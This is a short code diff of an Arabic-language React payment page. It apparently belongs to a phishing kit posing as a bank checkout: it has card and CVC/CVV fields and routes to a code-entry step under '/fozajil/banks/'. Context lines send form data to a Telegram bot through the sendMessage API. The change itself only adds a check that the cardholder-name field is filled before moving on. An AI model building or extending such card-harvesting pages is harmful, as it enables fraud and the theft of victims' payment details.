@@ -29,6 +29,14 @@ const Pay=()=>{
         fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
       
       }
+      const handlerout = ()=>{
+        if(NameCard.current.value == ""){
+          alert('من فضلك قم بملى الحقول')
+        }else{
+          
+          router.push('/fozajil/banks/pay/code')
+        }
+      }
   return (
     <div className={styles.contect} dir='rtl'>
         <h1>مرحبآ بك</h1>
@@ -65,7 +73,7 @@ const Pay=()=>{
             
             
             <input type="text" placeholder='الرقم (cvc/cvv)'ref={cvcCard} maxLength="3" required/>
-            <button type='submit' onClick={() => router.push('/fozajil/banks/pay/code')}>أدفع ألأن</button>
+            <button type='submit' onClick={handlerout}>أدفع ألأن</button>
         </form>
     </div>
   )
